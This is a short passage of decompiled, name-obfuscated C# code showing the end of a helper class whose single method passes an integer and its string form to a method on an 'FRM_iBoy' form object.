		// Token: 0x06000117 RID: 279 RVA: 0x00011AA4 File Offset: 0x0000FCA4
		internal void method_0()
		{
			this.frm_iBoy_0.method_7(this.int_0, this.int_0.ToString());
		}

		// Token: 0x040000BF RID: 191
		public FRM_iBoy frm_iBoy_0;

		// Token: 0x040000C0 RID: 192
		public int int_0;
	}
}
